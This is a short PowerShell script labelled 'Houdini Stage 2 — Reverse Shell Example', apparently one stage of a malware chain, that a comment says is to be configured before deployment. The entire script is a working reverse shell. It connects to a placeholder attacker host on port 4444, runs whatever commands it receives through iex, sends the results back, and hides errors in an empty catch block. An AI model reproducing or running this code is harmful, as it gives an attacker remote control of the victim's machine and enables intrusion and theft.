# Houdini Stage 2 — Reverse Shell Example
# Configure $host and $port before deployment
try {
    $c = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444);
    $s = $c.GetStream();
    [byte[]]$b = 0..65535|%{0};
    while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
        $sb = (iex $d 2>&1 | Out-String );
        $sb2 = $sb + "PS " + (pwd).Path + "> ";
        $sbB = ([text.encoding]::ASCII).GetBytes($sb2);
        $s.Write($sbB,0,$sbB.Length);
        $s.Flush();
    }
    $c.Close();
} catch {}
